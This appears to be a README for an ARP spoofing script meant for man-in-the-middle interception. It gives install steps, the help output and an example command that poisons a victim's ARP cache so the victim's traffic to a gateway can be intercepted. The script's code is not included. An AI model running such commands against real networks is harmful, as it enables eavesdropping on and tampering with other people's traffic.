# ARP-spoofer
ARP Spoofer for MITM, send ARP Packets(false packets) to the victim on the network

## Usage
- `pip3 install -r requirements.txt`

output:

```
usage: spoofer.py [-h] [-tg TARGET] [-hs HOST] [-v]

ARP spoof script

options:
  -h, --help            show this help message and exit
  -tg TARGET, --target TARGET
                        Victim IP Address to ARP poison
  -hs HOST, --host HOST
                        Host IP Address, the host you wish to intercept packets for (usually the gateway)
  -v, --verbose         verbosity, default is True (simple message each second)
```

For instance, if you want to spoof `192.168.1.5` and the gateway is `192.168.1.1`

```
sudo python3 spoof.py -tg 192.168.1.5 -hs 192.168.1.1 --verbose
```
